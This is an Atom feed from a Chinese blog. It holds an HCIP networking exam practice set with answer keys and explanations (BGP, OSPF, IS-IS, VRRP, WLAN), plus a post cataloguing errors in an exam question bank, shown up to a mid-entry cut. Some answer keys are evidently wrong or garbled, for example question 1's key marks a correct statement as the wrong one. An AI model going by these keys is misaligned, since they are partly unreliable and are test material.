<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>十二惊惶</title>
  
  <subtitle>犁牛之子骍且角，虽欲勿用，山川其舍诸</subtitle>
  <link href="https://shierjinghuang.github.io/atom.xml" rel="self"/>
  
  <link href="https://shierjinghuang.github.io/"/>
  <updated>2024-01-01T00:26:43.971Z</updated>
  <id>https://shierjinghuang.github.io/</id>
  
  <author>
    <name>十二惊惶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HCIP习题集</title>
    <link href="https://shierjinghuang.github.io/2023/10/01/HCIP%E4%B9%A0%E9%A2%98%E9%9B%86/"/>
    <id>https://shierjinghuang.github.io/2023/10/01/HCIP%E4%B9%A0%E9%A2%98%E9%9B%86/</id>
    <published>2023-10-01T03:32:31.000Z</published>
    <updated>2024-01-01T00:26:43.971Z</updated>
    
    <content type="html"><![CDATA[<h3><center>HCIP习题集</center></h3>**1 .关于IBGP邻居和EBGP邻居描述错误的是 (A)**<pre class="line-numbers language-none"><code class="language-none">A.BGP邻居关系建立在TCP会话基础之上的,采用的端口号是179B.ISIS运行在IP协议基础之上,采用的协议号89C.BGP运行在UDP会话基础之上,采用的端口号是179   D.OSPF运行在IP协议基础之上,采用的协议号是90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解析： BGP工作在tcp之上，传输层协议是179。IS-IS运行在数据链路层。OSPF运行在IP协议上，协议号为89 </p><p><strong>2 .关于IBGP邻居和EBGP邻居描述错误的是 (C)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.如果两个交换BGP报文的对等体属于不同的自治系统,那么这两个对等体就是EBGP对等体B.如果两个交换BGP报文的对等体于同一个自治系统,那么这两个对等体就是IBGP对等体C.IBGP对等体之间必须物理上直连D.两个运行BGP的路由器要建立TCP的会话就必须要具备IP连通性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：同一个AS内部的BGP邻居为IBGP，不同AS之间的BGP邻居为EBGP。BGP基于TCP 179号端口传递协议报文，建立邻居前必须要建立TCP的连接，因此需要邻居之间IP互通</p><p>BGP可以通过loopback建立对等体时可以跨物理邻居，所以IBGP对等体之间可不物理上直连，只需要路由可达</p><p><strong>3 .当在配置BGP的时候,如果产生了此类告警:“BGPI6ESTABLISHED:OID[oid] The BGP FSM enters the Establishedstate,下列描述正确的是(A)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.说明BGP邻居已经建立B.该警告信息为异常信息,必须处理C.说明由于TCP的问题导致此类告警产生   D.说明由于BGP邻居之间OPEN报文协商出现问题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解析：提示信息中的：Establishedstate 表示邻居已经建立成功。因此答案选A。</p><p><strong>4 .关于BGP可靠的路由更新,描述正确的是(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.BGP工作在UDP之上,传输层协议是179             B.BGP无需周期性通告路由信息C.BGP每次路由更新都发送完整的路由表信息          D.BGP采用组播更新<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>5 .第三类LSA的Link ID是(C)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.所描述的ABR的Router IDB.所在网段上DR的端口IP地址C.所描述的目的网段  D.生成这条LSAde路由器的Router ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong><font color="red">6 .某企业大楼有大量员工，通常都在上班时在大厅开始接入到公司得WLAN网络，随着每位员工走到各自得工位过程中，每个人得移动端叶通过漫游的方式漫游到各自的网络覆盖区域。为了尽量保证每个终端IP地址是固定的，建议的做法是？ (B)</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A.不配置VLAN POOL为每个移动终端配置静态的IP地址      B.配置VLAN POOL并配置Hash算法C.配置VLAN POOL并配置倾序算法 D.配置VLAN POOL任意配置算法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解析：VLAN分配算法为Hash时，VLAN POOL根据STP的MAC地址进行哈希运算后的结果为stp分配业务VLAN，只要配置VLAN POOL里面的VLAN不发生变化，通常STP都会获取到固定的业务VLAN，STP重新上线时也会被优先分配到之前使用过的IP地址 </p><p><strong>7 .下列关于VRRP的描述,错误的是(B)</strong> </p><pre class="line-numbers language-none"><code class="language-none">A.VRRP根据优先级来确定虚拟路由器中每台路由器的地位B.如果已经存在Master，Backup也会进行抢占C:当两台优先级相同的路由器同时Master时，比较接口IP地址大小，接口地址大者当选MasterD:如果backup路由器工作在非抢占方式下，则只要Master路由器没有出现故障，backup路由器即使随后被配置更高的优先级也不会成为Master路由器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>解析：如果master设备出现故障，backup设备才会根据优先级选举新的master设备</p><p><strong>8 .以下哪种攻击不属于网络层攻击(B)?</strong> </p><pre class="line-numbers language-none"><code class="language-none">A.ICMP攻击B.ARP欺骗攻击C.IP欺骗攻击D.Smurf攻击<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：ARP协议不属于三层网络层协议，而是属于链路层</p><p><strong>9 . 在域间报过滤中,以下树育outbound方向的是哪个选项(A)?</strong> </p><pre class="line-numbers language-none"><code class="language-none">A.trustuntrustB:untrust dmzC.trust-localD:untrust-trust <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>10 .在PIM-SM中，关于RP的描述错误的是(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.共享树里所有组的初始组播流都通过RP转发到接收者B.一个RP可以同时伟多个组播服务，一个组播组能对应多个RPC.RP可以负责几个或者所有组播得的转发，网络中可以有一个RPD.所有该组成员和向该组发送组播数据的组播源都向唯一的RP汇聚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>解析：一个RP可以同时伟多个组播服务， 但一个组播组只能唯一对应一个RP</p><p><strong>11 . 关于永久组播地址的描述,错误的是(D)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.所有运行OSPF协议的路由器都侦听2240.0.5B.网段内所有主机和路由器都侦听224.0.0.1C.所有路由器都侦听224.0.0.2        D.所有运行PIM协议的路由器都侦听224.0.0.100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解析:224.0.0.1所有主机的地址，224.0.0.2所有组播路由器的地址，224.0.0.5 ospf(Open Shortest Path First，开放最短路径优先)路由器，224.0.0.6 ospf dr(Designated Router，指定路由器)不存在侦听224.0.0.100</p><p><strong>12 . 以下关于堆叠MAD检测说法错误的是(A)?</strong> </p><pre class="line-numbers language-none"><code class="language-none">A.堆叠系统互为代理进行MAD检测时，两个堆叠系统可以使用相同的Domain IDB.MAD检测的方式分为直连检测、代理检测C.MAD 代理检测要求所有堆叠成员斗鱼代理设备相连，并且相连的链路加入到一个Eth-Tunk内D.MAD 直连检测可以通过中间设备叶可以采用full-mesh的方式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析:支持两套堆叠系统为代理进行多组检测，此时必须通过配置保证两套堆叠系统的MAD域值Domain ID不同</p><p><strong>13 .如下那个工具不能用于路由过滤(A)?</strong> </p><pre class="line-numbers language-none"><code class="language-none">A.policy-based-routeB.ip community-filterC.IP-prefixD.route-policy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析:policy-based-route基于路由器产生流量配置策略路由</p><p><strong>14 .下面关于BGP特性的描述，错误的是(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.BGP是外部路由协议，用来在AS之间传递路由信息B.BGP是一种链路状态协议C.BGP支持CIDR   D.BGP具有丰富的路由过滤和路由策略 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解析: BGP是距离矢量协议 </p><p><strong>15 .在IS-IS的广播网络中，Level-2路由器使用哪个组播MAC地址作为发送IIH的目的地址(C)？</strong></p><pre class="line-numbers language-none"><code class="language-none">A.0180-c200-0016B.0180-c200-0014C.0180-c200-0015D.0180-c200-0002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：在IS-IS的广播网络中，Level-2路由器使用的是0180-c200-0015的MAC地址，而Level-1是0180-c200-0014</p><p><strong>16 .下面哪个IEEE 802.11标准对应wi-fi 6？(D)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.802.11acB.802.11bC.802.11nD.802.11ax<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><font color="red">17 . 配置双链路热备时,工程师配置的CAPWAP心跳检测的间隔时间为20秒,并且使能双链路备份功能,则AP检测到主链路超时进行主备切换的时间为(C)?</font></strong> </p><pre class="line-numbers language-none"><code class="language-none">A.75秒B.20秒C.60秒D.90秒<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析： 缺省情况下，CAPWAP心跳检测的间隔时间为25秒，心跳检测报文次数为6。如果开启了双链路备份功能，则缺省情况下，CAPWAP心跳检测的间隔时间为25秒，心跳检测报文次数为3。本题中时间为20秒且配置CAPWAP,故时间为60秒 </p><p><strong>18 .下列关于VRRP的描述，错误的是(A)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.在使用协议时，需要在路由器上配置虚拟路由器号和虚拟IP地址，直接使用主用路由器的真实MAC， 这样在这个网络中就加入了一个虚拟路由器B.VRRP是一种冗余备份协议，为具有组播或广播能力的局域网(如以太网)设计，保证当局域网内主机的下一跳路由器设备出现故时，可以及时地由另一台路由器来代替，从而保持网络通信的连续性和可靠性C.一个虚拟路由器由一个主路由器和若干个备份路由器组成，主路由器实现真正的转发功能，当主路由器出现故障时，一个备份路由器将成为新的主路由器并接替它的工作D.网络上的主机与虚拟路由器通信，不需要了解这个网络上物理路由器的所有信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析： 在使用协议时，需要在路由器上配置虚拟路由器号和虚拟IP地址，直接使用虚拟路由器的虚拟MAC，这样在这个网络中就加入了一个虚拟路由器 </p><p><strong>19 .配置VRRP跟踪物理接口状态的命令是(C)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.track vrrp vrid 1 interface Gigabitethernet 0&#x2F;0&#x2F; 0B.vrrp vrid 1 interface Gigabitethernet 0&#x2F;0&#x2F;0C.vrrp vrid 1 track interface Gigabitethernet 0&#x2F;0&#x2F;0D.vrrp vrid 1 interface Gigabitethernet 0&#x2F;0&#x2F;0 track<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：vrrp vrid track interface命令用来使能VRRP通过监视接口的状态</p><p><strong>20 .状态检测防火墙在对后续数据包(非首包)进行转发时，主要依据以下哪一项(D)?</strong></p><pre class="line-numbers language-none"><code class="language-none">A.Route表B.OFIB表C.MAC地址表D.Session表<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：状态检测防火墙首包通过时建立会话表，后续包直接匹配会话表项进行转发</p><p>**21 .ACL命令acl[number] acl-number[match-order{auto l config} ] ， 其中acl-number用于指定访问控制列表的编号， 基本访问控制列表的acl-number取值范围是(D) **</p><pre class="line-numbers language-none"><code class="language-none">A.1000~3999B.0~1000C.3000~3999D.2000~2999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：基本访问控制列表（2000～2999）和高级访问控制列表（3000～3999）</p><p><strong>22 .下列哪种工具不能被route-policy的apply子句直接引用(A)?</strong></p><pre class="line-numbers language-none"><code class="language-none">A.IP-PrefixB.tagC.communityD.origin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：apply子句用来指定动作，路由通过Route-Policy过滤时，系统按照apply子句指定的动作对路由信息的一些属性进行设置，BCD都是一种属性，A是路由工具</p><p><strong>23 .下面关于各个协议的缺省路由，描述错误的是(C)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.BGP可以下发缺省路由B.IS-IS可以下发缺省路由C.OSPF不能下发缺省路由D.可以配置静态缺省路由<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：OSPF缺省路由通常应用于下面两种情况：1）由区域边界交换机（ABR）发布Type3 LSA，用来指导区域内路由器进行区域之间报文的转发；2）由自治系统边界交换机（ASBR）发布Type5 LSA或Type7 LSA，用来指导OSPF路由域内路由器进行域外报文的转发。</p><p><strong>24 .在广播类型网络中， DIS默认发送Hello时间间隔为多少?(D）</strong></p><pre class="line-numbers language-none"><code class="language-none">A.5sB.10sC.40sD.3.3s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：IS-IS中DIS发送Hello时间间隔默认为10/3秒，而其他非DIS路由器发送Hello间隔为10秒。</p><p><strong>25 . 下面关于LSA3、LSA4和LSA5,描述正确的是:(A)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.LSA5在穿越不同区域后,不会发生改变,而LSA3会发生变化B.LSA3.LSA4和LSA5在穿越不同区域后,都不会发生改变C.LSA3在穿越不同区域后,不会发生改变,而LSA4和LSA5会发生变化D.LSA4在穿越不同区域后,不会发生改变,而LSA3和LSA5会发生变化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：LSA3与LSA4类在穿越不同区域后通告者会发生变化而LSA5类通告者不会发生变化</p><blockquote><p><font color="blue">LSA1:一类LSA在一个区域内传输，只要OSPF协议中产生路由就会产生一类LSA</font><br><font color="blue">LSA2:二类LSA也是在一个区域之中传递路由，它是对一类LSA的子网掩码作为补充</font><br><font color="blue">LSA3:三类LSA在一个区域内不能被修改，当跨区域时，会修改ADV-ROUTER 为当前区域的ABR</font><br><font color="blue">LSA4:四类LSA在跨区域时，会修改ADV-ROUTER为当前区域的ABR,四类LSA为特殊的三类LSA</font><br><font color="blue">LSA5:传播整个OSPF区域，头部包括LS-ID.ADV-ROUTER（为ASBR的RID），所以在穿越不同区域后，不会发生改变，泛洪全网路由</font><br><font color="blue">LSA7 :在NSSA区域传播，七类只会在特殊区域NSSA区域才会岀现</font></p></blockquote><p><strong>26 .下面关于 OSPF 的描述正确的是(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.OSPF采用Bellman-Ford算法，每个路由器都独立运行该算法B.OSPF每隔30分钟进行定期更新C.OSPF每隔5s泛洪一个LSUD.OSPF本身没有确定机制，所以 OSPF 依靠上层协议即TCP确认进行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：OSPF采用SPF算法，每个路由器都独立运行该算法，OSPF每隔5s泛洪一个HELLO报文， OSPF有keeplive 确认机制 </p><p><strong>27.下列哪个OSPF区域，只能通过默认路由到达其他区域？(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.骨干区域B.Totally stub区域C.NSSAD:非骨干区域 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：totally stub区域即不允许外部路由在区域内广播也不允许域间路由在区域内传播。而NSSA区域能够引入外部路由，同时又不会学习来自OSPF网络其它区域引入的外部路由</p><p><strong>28 .关于配置 Stub 区域需要注意的事项中，描述正确的是(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.虚连接可以穿越 Stub 区域B.如果将一个区域配置成为 Stub 区域,则该区域中的所有路由器都要配置 Stub 区域属性C.骨干区域可以配置成为 Stub 区域D.Stub 区域可以存在 ASBR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：Stub区域不会存在 ASBR ,因为 Stub 区域屏蔽了3 4 5 7 类LSA,而我们把引入外部路由的路由器称为 ASBR配置Stub区域时需要注意下列几点:1.骨干区域不能被配置为 Stub 区域，2.Stub 区域中的所有路由器都必须将该区域配置为 Stub，3.Stub 区域内不能引入也不接收 AS 外部路由，4.虚连接不能穿越 Stub 区域，5.Stub 区域内不存在ASBR</p><p><strong>33 .在VPN技术中属于远程访问VPN（Remote Access VPN）的是 SSL VPN(A)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.SSL VPNB.IPsec VPNC.MPLS VPND.GRE Over IPsec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><font color="red">42 .在WLAN网络中使能HSB备份组时，若AP在主AC上线之后，再在备AC上离线添加AP信息，则备AC上的AP状态会显示为fault(A)</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A.TRUEB.FALSE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：没啥好说的一套题目里关于这道题有两个答案也是离谱</p><p><strong>122 .IS-IS中NET地址的总长度最小值是以下选项中的哪一项(A)？</strong></p><pre class="line-numbers language-none"><code class="language-none">A.8B.16C.2D.20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：地址总长度最长为13+6+1=20Byte，最短为1+6+1=8Byte。</p><p><strong>144 .能够生成组播分发树的组播协议是？(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.IGMPv2B.PIMv2C.BGPD.OSPF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：PIM是专门用于在组播网络中，在单播路由的基础上，创建组播分发树的协议</p><p><strong>195 . 以下关于BGP中Keepalive报文消息的描述，错误的是哪一项？ (D)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.Keepalive周期性的在两个BGP邻居之间发送B.Keepalive报文主要用于保持BGP对等体间的连接c.Keepalive报文只包含一个BGP数据报头D.缺省情况下，keepalive的时间间隔是180s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：BGP的keepalive发送时间间隔为60s，holdtime时间为180s。keepalive报文只包含BGP数据包头，主要作用是保活路由器之间的运行状态和链路的可用性</p><p><strong>213.关于RIB与FIB说法错误的是?(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.FIB直接指导报文的转发B.RIB中的下一跳都是对端直连邻居接口的IP地址C.FIB由RIB生成D.RIB不直接指导报文的转发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：路由器转发数据包的关键是RIB表和FIB表，每个路由器都至少保存着一张RIB表和一张FIB表。路由器通过RIB表选择路由，FIB由RIB生成，通过FIB表指导报文进行转发，RIB中的下一跳可以不是对端直连邻居接口的IP地址</p><p><strong>229 .下面哪类LSA可以携带外部路由的tag标签信息(C)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.LSA3B.LSA2C.LSA5D.LSA4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 解析：LSA5是由ASBR产生用来描述外部路由的LSA，携带外部标签的是LSA5 </p><p><strong>251 . 地址转换技术的优点不包括 (C)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.地址转换可以使内部网络（私有IP地址）使用公网地址访问InternetB.地址转换可以使内部局域网的许多主机共享一个IP地址上网C.地址转换能够处理IP报文头加密的情况D.地址转换可以屏蔽内部网络的用户，提高内部网络的安全性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：地址转化技术（NAT）可以实现私网IP地址转换成公网IP，从而实现私网访问公网，并且NAPT可以让多个私网IP转换成一个公网IP的多个端口号，从而实现许多个主机共享一个地址上网，地址转换可以屏蔽内部网络的用户，提高内部网络的安全性。NAT并不能处理IP包头加密</p><p><strong>353 .下面哪种OSPF报文携带主从关系信息？(C)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.LSA Update报文B.LSA Request报文C.DD报文D.Hello报文<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：主从关系协商完毕后开始交换DD报文，此时状态为Exchange</p><p><strong><font color="red">338 .两台VRRP路由器组成了VRID为2的备份组，并配置虚拟IP地址为2001::1，那么该备份组的虚拟MAC地址是以下哪一个？(C)</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A.00-00-5E-00-01-02  B.00-00-5E-00-02-01C.00-00-5E-00-02-02D.00-00-5E-00-01-01 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：虚拟路由器根据虚拟路由器ID生成的MAC地址。一个虚拟路由器拥有一个虚拟MAC地址，格式为：00-00-5E-00-01-{VRID}(VRRP for IPv4)；00-00-5E-00-02-{VRID}(VRRP for IPv6) ,2001::1为IPv6地址答案应该选C</p><p><strong>387 . 以下关于IS-IS协议说法错误的是？(D)</strong></p><pre class="line-numbers language-none"><code class="language-none">A. IS-IS协议支持CLNP网络    B. IS-IS协议支持IP网络C. IS-IS协议的报文直接由数据链路层封装  D. IS-IS协议是运行在AS之间的链路状态协议<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解析：IS-IS协议是一种内部网关协议</p><p><strong>419 .下面关于0SPF邻居关系和邻接关系描述,正确的是(D)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.邻接关系由OSPF的DD报文维护B.OSPF路由器在交换Hello报文之前必须建立邻接关系C.邻居关系是从邻接关系中选出的、为了交换路由信息而形成的关系D.并非所有的邻居关系都可以成为邻接关系<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解析：hello报文的作用是建立和维护邻居关系，DD报文的作用是选举主从关系以及描述lsdb的摘要信息。OSPF的邻居建立过程为init-2way ，此过程都是交互hello报文，并不交互任何路由信息。邻接关系建立过程为exstar-exchange-loading-full。此过程交互的是D LSR、LSU、LSACK，此过程交互的才包含路由和拓扑信息。因此ABC错误。在MA网络中，Drother之间的关系会停留在2way，为邻居关系</p><p><strong>420 .下面不属于IGP的是？(C)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.RIPB.IS-ISC.BGPD.OSPF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：按工作区域分类：IGP（内部网关协议）包括RIP、IS-IS、OSPF，EGB（外部网关协议）包括BGP</p><p><strong>421 .与华为NetEngine智能路由器共同构建IP广域承载网络解决方案的关键组件是？(B)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.iMaster NCE-FabricB.iMaster NCE-IPC.iMaster NCE-CampusD.iMaster NCE-WAN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：广域承载网络解决方案的组件包括NetEngine8000和iMaster NCE-IP，SD-WAN,网络解决方案组件包括全系列NetEngineAR以及iMaster NCE-WAN以此判断题目应该选择nce-ip。</p><p><strong>423 . VRRP设备在备份组中的默认优先级为(D)</strong></p><pre class="line-numbers language-none"><code class="language-none">A.0    B.200     C.150      D.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解析：VRRP设备的默认优先级为100，数值越大越优先 </p><p>判断</p><p><strong>863 . AS边界路由器可以是内部路由器IR，或者是ABR，必须属于骨干区域( 错误 )</strong> </p><p>解析：AS边界路由器指具有引入外部路由能力的路由器。AS边界路由器有可能是OSPF网络中的任何一个路由器</p><p><strong>885 . 如果DR Priority被设置为0，那么在OSPF路由域中，该路由器允许被选举成DR或者BDR，只不过优先级最低 ( 错误 )</strong></p><p>解析：优先级被设置为0后，路由器不参与DR和BDR的选举 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;center&gt;HCIP习题集&lt;/center&gt;&lt;/h3&gt;
**1 .关于IBGP邻居和EBGP邻居描述错误的是 (A)**

&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;A.BG</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="网络工程" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>831新题库问题题目汇总</title>
    <link href="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/"/>
    <id>https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/</id>
    <published>2023-09-18T03:32:31.000Z</published>
    <updated>2023-09-19T01:35:29.162Z</updated>
    
    <content type="html"><![CDATA[<h2 id="831新题库问题题目汇总"><a href="#831新题库问题题目汇总" class="headerlink" title="831新题库问题题目汇总"></a>831新题库问题题目汇总</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 写在前面 这个并非最终版本 有些题目已经交给博赛那边 那边还没有给出全部回复</span><span class="token comment"># 没有图片的题目 我稍后会发一个视频</span><span class="token comment"># 在询问问题前 可以先查一下这个文档 我这边确实还有些事 ， 经过这几天与博赛那边的扯皮我确实也心力憔悴</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：解析部分红色字体为博赛提供 蓝色字体由我提供</p></blockquote><ul><li><p><strong><font color="red">第1题与第123题题目完全一致答案不同，并且老题库答案统一为C项</font></strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/1题.png" style="zoom: 60%;" /><blockquote><p><font color="blue"><strong>解析：</strong>第1题A项错误，解析来自 [HiSecEngine USG6680E-ACC V600R023C00 产品文档]</font></p></blockquote><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/1题解析.png" style="zoom:60%;" /></li><li><p><strong><font color="red">17题答案错误： 选B</font></strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/17题.png" style="zoom: 60%;" /><p>这题能发现答案错误，也是因为他跟我之前翻别人博客的答案矛盾，自己查PPT确定,题库答案错误：</p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/Transit LSP配置.png"  /><p><strong>36</strong>，这道题是我第一轮看到时候的疏忽，36与237的题干有所不同，这一题目答案应该没问题，具体解析如下：</p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/36题解析.png" style="zoom:80%;" /></li><li><p><strong>38，182，322，369 四道题目完全相同的 <del>单选</del> 出现了三个答案</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/182题.png" style="zoom: 50%;" /><ul><li><p>38与182题选择了  DHCP Snooping可以通过设置信任端口防止非法攻击 </p></li><li><p>322题选择了，在交换机的系统视图下执行dhcp snooping命令，则该交换机可以同时处理DHCPv4和DHCPv6报文 </p></li><li><p>369选择了  在VLANIF接口视图下使能DHCP Snooping功能，则对该接口下的所有DHCP报文命令功能生效 </p><blockquote><p>个人推测这一题为A项错误，B C项 是课件原话，D项在[华为WLAN AC 6000 命令参考][<a href="https://support.huawei.com/enterprise/zh/doc/EDOC1100156648/f8665c96]%E9%87%8C%E6%89%BE%E5%88%B0%E4%BA%86%E5%8E%9F%E8%AF%9D%EF%BC%8CD%E9%A1%B9%E6%AD%A3%E7%A1%AE">https://support.huawei.com/enterprise/zh/doc/EDOC1100156648/f8665c96]里找到了原话，D项正确</a></p></blockquote><blockquote><p><strong>解析</strong>：<font color="orangered">DHCP Snooping的信任功能，是保证客户端从合法的服务器获取IP Internet Protocol 地址</font></p></blockquote><blockquote><p><font color="orangered">DHCP Snooping是DHCP的一种安全特性，用于保证DHCP客户端从合法的DHCP服务器获取IP地址，并记录DHCP客户端IP地址与MAC地址等参数的对应关系，防止网络上针对DHCP攻击</font></p></blockquote></li></ul></li><li><p><strong>95与248 275 326 三道题目 答案矛盾</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/95题.png" style="zoom:80%;" /><blockquote><p><font color="blue">C项明显错误：OSPF IGP Routers：FF02::5；OSPF IGP DR：FF02::6，选择A项</font></p></blockquote></li><li><p><strong>121，125，587 三道题同样的题目，两道单选一道多选</strong></p><p>第121题为多选 和125题 587题 一样  答案 BCD</p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/121题.jpg" style="zoom:75%;" /></li><li><p><strong>129.这个题答案应也错了，在翻看华为PPT的时候新发现的错误</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/129题.png" style="zoom: 60%;" /><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/119题.png" style="zoom:60%;" /><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/Link-LSA解析.png" style="zoom: 60%;" /><blockquote><p>129题应该选 B 119 题 AB都有问题</p></blockquote></li><li><p><font color="red">151，787，876 三道题目题干与选项完全相同，<strong>两道多选一道单选</strong></font></p></li><li><p><strong>164，357，572，593 在 <del><code>572，593</code></del> 两道多选题中  并没有选 <code>实现Sub-VLAN间广播域的隔离 </code> 而在两道单选题中这两个都被认为是正确的</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/164题.png" style="zoom: 60%;" /><p>解析：B项，增加了可用VLAN的数量显然错误，C项增加了编址的灵活性理应增强，解析如下</p><blockquote><p><font color="blue">PPT vlan高级技术有：多个Sub-VLAN共享一个网关地址，节约了子网网络地址、子网定向广播地址、子网缺省网关地址，且各Sub-VLAN间的界线也不再是从前的子网界线了，可以根据每个Sub-VLAN内所需的IP地址数量进行灵活的地址规划，从而既保证了各个Sub-VLAN作为一个独立广播域实现广播隔离，又节省了IP地址资源，提高了编址的灵活性</font></p></blockquote></li><li><p><strong>166题这一题目也有一定疑惑</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/166题.png" style="zoom:67%;" /><blockquote><p><del>解析：选B</del></p><blockquote><p> <font color="blue"> 既然提出这个问题我必然是找到了材料</font></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/GRE隧道实例.png" style="zoom:67%;" /></blockquote></blockquote></li><li><p><strong>206 这题答案应该是错了？ MPLS标签值为0就是必须被弹出</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/MPLS弹出.png" style="zoom:60%;" /><blockquote><p><font color="orangered">这题的正确选项为A 